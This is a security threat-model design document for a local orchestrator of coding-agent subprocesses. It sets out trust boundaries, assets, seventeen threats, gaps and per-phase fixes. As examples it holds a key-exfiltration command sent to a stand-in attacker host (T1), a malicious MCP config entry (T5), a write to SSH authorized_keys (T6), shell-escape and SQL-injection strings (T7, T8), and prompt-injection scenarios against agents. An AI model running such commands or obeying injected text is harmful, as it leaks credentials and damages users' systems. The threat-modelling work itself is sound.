# Phase 0.E — Threat model

**Status:** Phase 0 writeup. Phase 1 engineers must read before freezing contracts; gaps in §6 and blockers in §7 override PLAN defaults.

**Scope.** Threats to shamu as specified in `PLAN.md` — a local-first, single-box, TypeScript-on-Bun orchestrator that spawns heterogeneous coding-agent subprocesses, stores credentials/events/mailbox in SQLite + OS keychain, exposes an HTTP dashboard and a webhook receiver, and hands patches into GitHub via `agent-ci`. Phase 8 adds A2A and a daemon; that surface is called out where relevant.

---

## 1. Data-flow diagram

```
                                ┌──────────────────────────────┐
                                │        VENDOR APIs           │
                                │ api.anthropic.com            │
                                │ api.openai.com               │
                                │ cursor/amp/gemini/opencode…  │
                                └───────▲──────────┬───────────┘
                       prompts, tool args,│          │ assistant deltas,
                       vendor API key     │          │ tool-call JSON, usage,
                                          │          │ session_id
                                          │          │
                        ┌─────────────────┴──────────▼──────────────────┐
                        │        AGENT SUBPROCESSES (Bun.spawn)         │
                        │  Claude CLI | Codex | OpenCode | Pi | Kimi... │
                        │  CWD=worktree, allowlisted env, signals via   │
                        │  adapter handle only                          │
                        └──▲───────┬─────────────────┬─────────────────┘
     stdin:                │ JSONL │                 │ file reads/writes
     UserTurn JSON         │ stdout│                 │ (pre-commit gate)
                           │ events│                 │
                           │       │                 ▼
   ┌──────┐  CLI cmds   ┌──┴───────▼──┐    ┌─────────────────────┐
   │      │──────────▶ │              │    │  LOCAL STATE        │
   │ USER │            │  SHAMU CORE  │◀──▶│  SQLite (WAL)       │
   │(term │◀─────────── │              │    │  events, mailbox,   │
   │ /web)│  stdout    │  supervisor  │    │  leases, audit      │
   └──▲───┘   JSON     │  scheduler   │    │  OS keychain        │
      │   SSE events   │  flow engine │    │  git worktrees      │
      │   (dashboard)  │  watchdog    │    │  mailbox .jsonl     │
      │                │  webhook rcv │    │  raw_events         │
      │                │  dashboard   │    └─────────────────────┘
      │                └────┬───▲────┬────────────────────────────┘
      │                     │   │    │
      │         webhooks    │   │    │ spawn `agent-ci` (Docker)
      │         (HMAC,      │   │    │ ─────────────────────▶  AGENT-CI
      │         replay)     │   │    │                         (Docker)
      │                     │   │    │                           │
      │                     ▼   │    │                           │ JUnit/
      │       ┌──────────────┐  │    │                           │ JSON
      │       │  cloudflared │  │    │                           │
      │       │  (dev only)  │  │    │                           ▼
      │       └──────┬───────┘  │    │                         artifacts
      │              │          │    │
      │              ▼          │    │
      │      ┌──────────────────┴─┐  │    ┌───────────────────┐
      │      │   LINEAR           │  │    │      GITHUB        │
      │      │   MCP server +     │──┘    │   protected branch │
      │      │   webhooks         │       │   req status check │
      │      └────────────────────┘       │   signed commits   │
      │            OAuth 2.1 DCR,         │   (push via git)   │
      │            rolling comment        └───────────────────┘
      │
      ▼ (Phase 8, A2A over JSON-RPC + SSE, Signed Agent Cards)
 remote shamu peers
```

**Edge labels worth calling out.** User → shamu: CLI args, config, prompts. Core → vendor: API key + prompt + tool definitions. Vendor → core: assistant text, tool calls with attacker-controlled JSON, usage, cost. Core ↔ SQLite: every event, every control action, every audit entry. Agent subprocess → filesystem: edits inside worktree; outside worktree is a policy violation caught at pre-commit. Linear → core: webhooks containing human-typed text in labels/comments (untrusted input). cloudflared → webhook receiver: publicly reachable tunnel during `shamu linear tunnel`. GitHub: only a sink; shamu pushes commits, GitHub enforces required checks.

---

## 2. Trust boundaries

1. **User ↔ host shell.** User is root of trust on this box. Shamu runs in the user's session, inheriting their filesystem access. Anything a compromised shamu can touch, the user already could.
2. **Host ↔ agent subprocess.** Agent subprocesses are **partially untrusted** — they execute LLM output. Prompt injection can turn them into a confused deputy. Isolation: allowlisted env, CWD pinned to worktree, signals brokered through adapter handle, pre-commit guard on writes. Network egress isolation is **not present in phases 1–7** (PLAN §Security defers to Phase 8 containerization).
3. **Host ↔ vendor API.** Vendor API is trusted for assistant text content (we let it talk) but **untrusted for tool-call args** — those are attacker-controllable via prompt injection and must be validated before dispatch.
4. **Local ↔ webhook sender.** Linear (or an impostor) posts to a locally-reachable URL. HMAC + replay window + nonce cache make Linear trustworthy; anyone else is a forger.
5. **Local ↔ dashboard client.** 127.0.0.1 is trusted (single-user machine). A tunnelled or `--unsafe-bind` dashboard is untrusted and must enforce OIDC + CSRF.
6. **Shamu ↔ MCP server (in-process, stdio, http).** In-process MCP tools are trusted (we wrote them). stdio and http MCP servers are **as trusted as the package/URL in the user's config** — i.e., not very.
7. **Shamu ↔ agent-ci (Docker).** Docker daemon is trusted on the host; the `agent-ci` image is as trusted as its provenance (signed / pinned-digest / supply-chain).
8. **Shamu ↔ A2A peer (Phase 8).** Peer is untrusted until its Signed Agent Card verifies; bearer token is bound to the card issuer. Before verification, the peer is a raw network caller.
9. **Shamu ↔ OS keychain.** Keychain is trusted; any process running as the user can read it with user approval. Phase 1 must decide whether prompts to unlock are acceptable or the keychain item is marked "access without prompting for this app only."

---

## 3. Assets

| Asset | Where it lives | Confidentiality / Integrity / Availability |
|-------|----------------|---------------------------------------------|
| Vendor API keys (Anthropic, OpenAI, …) | OS keychain | C: critical; I: critical (swap key → exfil) |
| Linear OAuth tokens | OS keychain | C: critical; I: critical (swap token → silent issue rewrite) |
| GitHub push credentials | OS credential helper / SSH agent | C: critical; I: critical |
| User prompts + task text | Fed to vendor APIs; stored in `events` | C: may contain internal PII/secrets |
| Source code under working tree | git worktrees | C/I: critical — the product |
| Agent raw output | `raw_events` table | I: critical for replay/audit; C: can contain secrets |
| Normalized event projection | `events` table | I: critical for SSE, watchdog, cost |
| Mailbox messages | SQLite `mailbox` + `.shamu/mailbox/*.jsonl` | I: critical (cross-agent coordination) |
| Flow state | `flow_runs` | I: critical (resumability) |
| Audit log | `audit_events` (append-only) | I: critical; must survive compromise to reconstruct |
| CI artifacts | attached to run row | C/I: failures may contain secret strings |
| Cache directories | vendor-owned, per adapter | I: poisoning = wrong answers next run |

---

## 4. Threats

Compact table; non-obvious first. "Mitigation in PLAN" refers to a concrete §Security, patch-lifecycle, adapter-contract, or watchdog clause. "Gap?" lists what is missing or unclear.

| # | Asset | Threat | Attacker | Likelihood | Impact | Mitigation in PLAN | Gap? |
|---|-------|--------|----------|-----------|--------|--------------------|------|
| T1 | API keys | **Exfiltration via prompt injection in tool args.** Adversarial issue text or webhook comment tells an agent to `curl attacker.com -d $ANTHROPIC_API_KEY`. Agent produces a `Bash` tool call with the secret in argv. | Anyone who can put text into Linear, a PR comment, or source code seen by the agent | High (Linear text is essentially user input) | Critical (key theft) | Partial: allowlisted env blocks *most* vendor keys from reaching non-owner adapters; shell gate in Phase 2; redactor before `events` write. | **Yes.** Env allowlist still includes the vendor's own key for the owner adapter; a Claude worker *has* `ANTHROPIC_API_KEY` in env. Redactor runs at log-write time, not at tool-dispatch time — the exfil already happened over the network. No network egress allow-list in Phases 1–7 (PLAN §Security defers to Phase 8). |
| T2 | User prompts + secrets | **Secret leakage via logged events.** An event payload (e.g., `stdout` of a dumped env, a tool-result JSON containing a token) is written to `events`/`raw_events` in plaintext. | Any post-hoc reader of the DB (backup, screenshare, web dashboard viewer) | High (happens without any adversary) | High | §Security: central regex+value-hash redactor applied by projector before `events` write; planted-secret contract test. | **Partial.** `raw_events` is **verbatim, never migrated, never edited** per §2 — so the raw table is un-redacted by design. PLAN doesn't say raw_events is encrypted-at-rest or access-controlled. Backups (`VACUUM INTO`) inherit raw payloads. |
| T3 | Webhooks | **Replay / forgery of Linear webhook.** Attacker replays a captured `shamu:ready` to re-trigger work, or forges one to point the swarm at a malicious issue. | Network attacker on the tunnel path or anyone who ever saw a body | Medium (tunnel is public during `shamu linear tunnel`) | High (agent runs arbitrary work item) | §Security: HMAC-SHA256 constant-time compare, 5-min timestamp window, SQLite-backed nonce cache, per-IP rate limit. | **Low gap.** Two concerns: (a) PLAN doesn't specify whether the HMAC secret is rotated on `shamu linear tunnel` subdomain rotation; (b) timestamp window requires clock sync — no NTP check in `shamu doctor`. Both minor. |
| T4 | Dashboard | **Local dashboard reachable from non-loopback via tunnel misconfig.** User runs `shamu linear tunnel` to expose the webhook, but cloudflared is also pointed at `:3000` (dashboard), or the user passes `--unsafe-bind` without auth. | LAN peer / anyone on the internet | Medium (easy mistake) | Critical (remote interrupt/kill, read source code) | §Security: binds 127.0.0.1 by default; `--unsafe-bind` prints banner; team-mode OIDC; CSRF on state-changing endpoints; SSE `Origin` allow-list. | **Yes.** PLAN does not forbid `shamu linear tunnel` from accidentally tunneling the dashboard port — the two concerns are siblings in `packages/linear` and nothing enforces that the tunnel only proxies the webhook path. No banner on `shamu linear tunnel` that dashboards are *not* tunneled. No "tunnel only one path" guarantee in cloudflared config. |
| T5 | Agent subprocess | **Malicious MCP server injected via config file.** A pulled-request or shared config adds `mcp: { server: "npx evil-mcp" }` or `{ url: "http://attacker/mcp" }`; agent then calls its tools (which see prompts and can exfil). | Anyone who can submit a config change | Medium (config is code) | Critical (full prompt egress + tool-call control) | Capabilities declare `mcp: "in-process"/"stdio"/"http"/"none"`. | **Yes.** PLAN has no allow-list or signature requirement for MCP servers. A Phase 1 config schema must: (a) require stdio/http MCP entries to be explicitly approved by a signed config fingerprint or per-repo trust list; (b) surface any MCP server the user hasn't seen before with a `shamu doctor`-style prompt on first run. |
| T6 | Worktree isolation | **Agent writes outside its worktree via absolute path.** LLM emits `Write({ path: "/Users/alice/.ssh/authorized_keys", … })`. | Prompt-injection or model error | Medium | Critical (root-level config rewrites) | §Security: writes outside worktree fail at pre-commit guard; logged as policy violation. Per-agent worktree CWD pinned. | **Yes.** Pre-commit only catches *committed* paths. A `Write`/`Edit` tool call with an absolute path writes to disk *now*; the pre-commit guard doesn't rerun on every write. Adapter-side validation is needed before the tool call reaches the filesystem: reject absolute paths and `../` escapes at the adapter's permission handler. PLAN §4 (permission handler) implies this but doesn't spell out path-scope enforcement. |
| T7 | Agent subprocess | **Shell-escaping the Bash gate.** The permission allow/deny list (per-role patterns) is regex-based; `rm -rf /; : ||` or shell interpolation (`$(cat /etc/passwd)`) sneaks past a naive pattern. | Prompt injection | Medium–High | Critical | §Security: `PermissionMode` + per-role allow/deny patterns (Phase 2). | **Yes.** No guidance on *how* patterns are matched — regex on raw command string is known-bad. Phase 2 must: (a) tokenize with a real shell parser (e.g., `shell-quote`), (b) refuse commands with `$()`, backticks, pipes-to-bash, `eval`, unless explicitly whitelisted, (c) consider per-tool structured APIs (`fs_read`, `fs_write`) over raw `Bash` for routine ops. |
| T8 | SQLite integrity | **"Injection" via event payloads.** Payloads are JSON. If any query uses string concatenation rather than prepared statements, a crafted tool-result string could subvert a query. | Prompt injection | Low (if prepared-statement discipline holds) | High | §3 SQLite operational rules: "typed query helpers (no ORM — prepared statements)" for `packages/persistence`. | **Low gap.** PLAN already mandates prepared statements. Verify with a contract/lint rule: no dynamic SQL string building in `packages/persistence`. Add a test that a tool-result containing `'); DROP TABLE events; --` round-trips intact. |
| T9 | Cache | **Cache poisoning across runs (vendor cache-key confusion).** Anthropic's 5-min cache is keyed by prefix; if shamu reuses a prefix slot across runs with different system prompts / MCP tools, an earlier adversarial context taints the next run. | Earlier attacker whose prompt primed the cache | Medium | Medium (wrong-answer amplification) | Design principle #4: "each adapter owns its cache hygiene." | **Yes.** PLAN sets the principle but does not specify the cache-key composition contract. Phase 2 adapters must: (a) include `runId` (or a per-session salt) in cache-prefix composition; (b) flush caches when MCP tools or system prompt change; (c) contract-test assert that two runs with different system prompts do not share a cache hit. |
| T10 | A2A peer | **Peer impersonation before/during Signed Agent Card verification.** Bearer token replay or a self-signed card accepted because the verifier is permissive. | Network attacker / malicious peer | Medium (Phase 8 only) | High (peer can inject events/mailbox entries) | §8.B: Signed Agent Cards, bearer tokens bound to issuer. | **Yes (Phase 8).** PLAN doesn't specify: (a) which roots of trust accept cards (static trust list? DID? JWKS URL?); (b) nonce/audience binding to prevent cross-instance token reuse; (c) rate-limit + auth failure alert surfaces. Defer to Phase 8 spec; blocker before 8.B merges. |
| T11 | Supply chain | **Compromised npm package in an adapter.** `@some/adapter-sdk` ships a postinstall that reads keychain, or a vendor SDK minor update exfiltrates on first use. | Upstream maintainer compromise / typosquat | Low–Medium | Critical | — | **Yes, unaddressed.** PLAN says nothing about dependency pinning, npm provenance, `--ignore-scripts`, SBOM, or allow-listing network egress during install. Mitigations: lockfile + Bun/npm `audit` in CI, disable lifecycle scripts for production installs (`bun install --frozen-lockfile --ignore-scripts`), require `provenance` on direct deps where published, pin vendor SDKs to exact versions (not `^`). |
| T12 | Audit log | **Tampering with `audit_events`.** A bug or a compromised process updates/deletes audit rows post-fact. | Internal error or local attacker with DB access | Low | High (loses forensic trail) | §Security: "separate append-only `audit_events` table. Immutable; not co-mingled." | **Partial.** "Append-only" is a convention in SQLite, not a physical guarantee — any process with write access can `DELETE`. Enforcement options: (a) a `BEFORE DELETE/UPDATE` trigger that raises, (b) per-row HMAC chain (event n+1 includes hash of event n) so tampering is detectable, (c) periodic Merkle root copy to a separate file. Phase 1 should pick one. |
| T13 | Agent subprocess | **Signal/kill smuggling.** Worker spawns grandchildren outside Bun's process group; `shutdown()` leaks orphans. Contract-suite "no orphans" row addresses this but only for the test fixture. | Misbehaving adapter | Medium | Medium (resource exhaustion, ghost writers) | §1 adapter contract: `shutdown` reaps; `kill` signals brokered. Contract row "100-run stress: no orphans." | **Low gap.** Consider always spawning agents in a new process group (`detached: true` + `process.kill(-pgid)`) so a wild child gets SIGTERM'd with its parent. |
| T14 | Watchdog | **Silence-detector amplification.** A watchdog trip causes a supervisor escalation which triggers re-engagement which produces more churn, which looks stuck, which trips the watchdog again. | Self-inflicted | Medium | Medium (cost spiral, runaway escalation) | §6 watchdog: two observations at confidence≥medium; single-signal logged as hint. Design principle #6. | **No gap** — PLAN addresses this directly. Verify in Phase 3.D tests. |
| T15 | Dashboard | **SSE without Origin check over tunnel.** If someone ever tunnels the dashboard, SSE without an allow-listed Origin lets cross-origin scripts tail events. | Remote attacker who knows the tunnel URL | Medium (conditional on T4) | High | §Security: "SSE endpoint rejects `Origin` headers outside the configured allow-list." | **Low gap.** Clarify in Phase 7: the default allow-list is `http://127.0.0.1:*`, and `--unsafe-bind` requires the user to explicitly add an origin (not a wildcard). |
| T16 | Mailbox | **Cross-agent confused deputy via mailbox forgery.** `from_agent` is set by the writing worker; a compromised or misbehaving agent can claim to be another role (e.g., "reviewer approved"). | Prompt-injected worker | Medium | High (unauthorized flow transitions) | — | **Yes.** PLAN §5 doesn't specify authentication on `from_agent`. Phase 3.C should: (a) compute `from_agent` from the authenticated run context (not from the payload), (b) make the mailbox table's `from_agent` a non-nullable FK to the run row (enforce server-side), (c) reject writes where `from_agent` ≠ caller's run. |
| T17 | Cost accounting | **Budget bypass via subscription-tagged runs.** §Cost accounting says "subscription runs are tracked for auditability but never block." A compromised adapter could mis-tag all its cost as `confidence=unknown, source=subscription` to evade rate limits. | Compromised adapter | Low | Medium (unlimited spend) | — | **Yes.** Declare cost-source declarations immutable per-adapter (configured at install, not at runtime) or signed by the adapter's capability file. Otherwise budgets are advisory. |

---

## 5. Mitigations mapped to PLAN (Security & threat model subsections)

**Credential handling** — addresses T1 (partial: env allowlist, redactor), T2 (redactor before `events` write, planted-secret test). Does **not** address raw_events at rest (T2) or network egress (T1).

**Per-agent sandbox** — addresses T6 (worktree CWD pin, pre-commit), T7 (PermissionMode in Phase 2), T13 (signals brokered). Explicitly defers network-egress enforcement to Phase 8 containerization. Phase-1-through-7 runs therefore have **declarative-only** network isolation.

**Webhook hardening** — addresses T3 (HMAC, timestamp, nonce, rate limit). Does not address tunnel-scope misconfig (T4).

**Dashboard** — addresses T4 (127.0.0.1 default, `--unsafe-bind` banner, OIDC, CSRF) and T15 (Origin allow-list). Does not address T4's `linear tunnel` misrouting concern.

**Audit log** — addresses T12 at the convention level, not the enforcement level.

**Patch lifecycle (§Patch lifecycle)** — addresses T6 indirectly (pre-commit rejects out-of-lease writes; T16 benefits if lease ownership is authenticated), post-merge diff-overlap check addresses semantic collision risk that would otherwise manifest as silent last-writer-wins.

**Adapter acceptance (§Adapter acceptance criteria)** — "Secret redaction" row is the contract-level enforcement of T2. "No leaks (100-run stress)" covers T13. Cost/usage rows partially cover T17.

**Watchdog (§6)** — addresses T14 (confidence gating) and is the safety-net for T1/T7 in that runaway tool loops or cost spikes surface regardless of content.

**Quality gate (§10) + Phased §5.C** — branch protection + required status check + signed commits address **post-facto integrity**: even if a compromised agent pushes something, GitHub rejects it without the `agent-ci` status. This is the single strongest mitigation for "agent goes rogue and opens a PR."

---

## 6. Gaps (concrete edits PLAN should adopt)

**G1. Raw event confidentiality.** Add to §Security → Credential handling:
> "`raw_events` payloads containing vendor stdout/stderr/tool-result bodies MAY contain secrets. The redactor runs against both `events` and `raw_events` write paths. A raw copy without redaction MAY be retained in an encrypted sidecar (keyed via OS keychain) iff `retain_unredacted_raw=true` is set in config; default is false."
>
> Counterpart: §2 Event log currently says `raw_events` is "never edited" — clarify: never schema-migrated, but IS redacted in-flight on first write.

**G2. Network egress allow-list (pre-Phase 8).** Add to §Security → Per-agent sandbox:
> "Even without containerization, Phases 2–7 enforce an egress allow-list via a mandatory HTTP(S) proxy-env (`HTTP_PROXY`/`HTTPS_PROXY`) pointed at a shamu-local mitmproxy-style egress broker. The broker consults the run's `allowed_hosts` and logs+drops other destinations as `policy.egress_denied` events. Containerized enforcement in Phase 8 replaces the broker; the policy file format is shared."

**G3. MCP-server trust.** Add to §Security a new subsection "MCP trust":
> "MCP servers beyond in-process are declared in config and pinned by (a) package name + integrity hash for stdio, or (b) origin + TLS pin for http. First-run for a new MCP source requires `shamu mcp trust <fingerprint>` and writes an audit event. A webhook or CLI-delivered config cannot silently introduce a new MCP source."

**G4. Path-scope enforcement at tool-dispatch time.** Add to §Security → Per-agent sandbox:
> "The adapter's permission handler MUST validate every filesystem tool call's path against the current worktree: reject absolute paths outside the worktree, `..` escapes, and symlinks that resolve outside. This runs BEFORE the tool executes; the pre-commit guard is defense in depth, not the primary control."

**G5. Shell-argument parsing.** Add to §Security → Per-agent sandbox:
> "Shell-gate patterns match against a parsed AST (shell-quote or equivalent), not raw command strings. Commands containing `$()`, backticks, `eval`, pipes-to-shell, or process substitution are rejected unless explicitly allow-listed. Prefer structured tool APIs over `Bash` for routine operations."

**G6. Mailbox `from_agent` authentication.** Add to §5 Mailbox:
> "`from_agent` is assigned by the orchestrator from the authenticated run context, not accepted from the writer. The mailbox API signature takes no `from` parameter; writes where the caller does not own an active run are rejected."

**G7. Audit-log tamper-evidence.** Add to §Security → Audit log:
> "`audit_events` is HMAC-chained: row n includes `prev_hmac = HMAC(audit_secret, row_{n-1})`. The chain is verified on boot and on `shamu doctor`. A `BEFORE UPDATE OR DELETE` trigger on `audit_events` raises. `audit_secret` lives in the OS keychain."

**G8. Cost-source integrity.** Add to §7 Cost accounting:
> "`source` and `confidence` labels are set by the core from the adapter's declared capability, not from runtime adapter output. Adapters cannot upgrade/downgrade their cost source at event-emit time."

**G9. Supply-chain discipline.** Add to §Quality bars:
> "Direct dependencies pinned to exact versions; `bun install --frozen-lockfile --ignore-scripts` for production installs. CI runs `bun audit` (or equivalent). Vendor SDKs are installed behind a per-package allow-list; a new transitive with postinstall scripts fails CI."

**G10. Tunnel scope.** Add to §Security → Webhook hardening:
> "`shamu linear tunnel` provisions a cloudflared route restricted to the webhook path only (`/webhooks/linear`). The dashboard port is never exposed through `linear tunnel`. `shamu doctor` warns if any local port other than the webhook port is reachable through an active tunnel."

**G11. A2A trust roots (Phase 8 pre-req).** Add to §Phase 8.B:
> "Define acceptable Agent Card signers (static trust list in config or JWKS URL), audience binding on bearer tokens (`aud` = local instance ID), nonce replay cache, and per-peer rate limits before Track 8.B merges."

---

## 7. Per-phase blockers

Which gaps must close before which phase ships.

- **Before Phase 1 merges (contracts freeze):**
  - G4 (path-scope enforcement contract in `AgentAdapter` permission handler)
  - G6 (mailbox `from_agent` authentication in schema/API)
  - G7 (audit-log chain schema — can't retrofit without migration)
  - G8 (cost-source as capability-driven, not runtime-driven — it's a `Capabilities` field today, so clarify non-overridability now)
  - G9 (supply-chain CI rules — cheap to land early; expensive to add after dependencies sprawl)
  - T8 lint rule (no string-concat SQL) in `packages/persistence`.
- **Before Phase 2 merges (Claude + Codex adapters):**
  - G5 (shell parsing for the Claude `Bash` gate — Phase 2 is where the gate lands)
  - G1 decision (redactor on `raw_events` or encrypted sidecar) — applied to the first real vendor log volume.
  - T9: cache-key composition contract with `runId` salt, enforced by a contract test added to the adapter suite.
- **Before Phase 3 merges (supervisor/mailbox/watchdog live on real repos):**
  - G6 wired into the mailbox API (was schema in P1; now enforced at call sites).
  - T13: process-group `detached:true` spawn pattern in `packages/adapters/base`.
- **Before Phase 6 merges (Linear webhooks + tunnel land):**
  - G10 (tunnel scope restricted to webhook path; doctor warning)
  - T3 clock-sync check in `shamu doctor`.
- **Before Phase 7 merges (web dashboard, adapter fan-out):**
  - G3 (MCP trust prompt + audit) — the 6-adapter fan-out multiplies the MCP-server surface.
  - G2 (network egress broker) — **this is the hardest one** and must not wait for Phase 8. Every new adapter in Phase 7 is another unknown vendor host; without egress enforcement, any single adapter's prompt injection becomes a data-exfil primitive for the whole swarm.
  - T15 (explicit SSE Origin allow-list documented; `--unsafe-bind` UX requires explicit origin).
- **Before Phase 8 merges (daemon, A2A):**
  - G11 (A2A trust roots, audience, nonce, rate limit).
  - Containerized per-run sandbox replacing G2's broker.
  - Review G7 chain integrity audit after soak test.

**Summary of the most load-bearing gap:** G2 (network egress allow-list) — PLAN defers it to Phase 8, but Phase 7's adapter fan-out is where the realistic exfil paths multiply (T1 becomes high-likelihood). Land an in-process egress broker by Phase 7 even if containerization lands only in Phase 8.

---

## 8. Open questions for the user

1. **Primary deploy target.** macOS only (simplest: Keychain, `security` tool, `cloudflared`), or macOS + Linux (libsecret), or Linux-server-first? This changes keychain design, cloudflared invocation, sandbox primitives (Linux has cgroups/seccomp + containers; macOS has sandbox-exec + none-of-that-in-Docker-Desktop awkwardness).
2. **Corporate network egress policy.** If this runs behind a corporate proxy, vendor API calls must honor `HTTPS_PROXY` and trust a corporate CA bundle. Does G2's egress broker need to chain through an upstream proxy? Is that a Phase 0.E blocker or a Phase 2 config concern?
3. **Team mode identity.** If OIDC lands (§Security, Phase 7 team mode): single IdP (e.g., GitHub-only) or federation (GitHub + Google + Okta)? Federation multiplies the claim-validation surface and changes audit-event identity.
4. **CI runtime.** Does shamu ever run *inside* GitHub Actions (e.g., a scheduled swarm on a hosted runner), or is it always a dev-laptop tool? Actions runners have different secret surfaces (`GITHUB_TOKEN`, short-lived OIDC), no OS keychain, and a generally-hostile filesystem. If yes, add a second credential backend (env-vars with explicit-allowlist) and adjust the threat model for the ephemeral-runner case.
5. **`raw_events` retention.** Default 14-day retention is called out; is that compatible with incident forensics? If a secret leaks into `raw_events` and is only caught at day 30, we've already pruned the evidence.
6. **Keychain interaction model.** Prompt on every access vs. "always allow for this app"? The former is user-hostile during autonomous mode; the latter weakens T1 containment if shamu is ever compromised.
7. **Autonomy ceiling and A2A exposure.** PLAN §Open questions already asks about a `fully-autonomous` mode. From a threat-model standpoint, fully autonomous + A2A = the first real remote-attacker-to-agent path. Recommend explicit "no" unless G11 + G2 + G3 + G4 are all green.

---

*Word count: ~2150. Audience-priority: §4 and §6 first; §7 is the scheduling contract with Phase 1 engineers.*
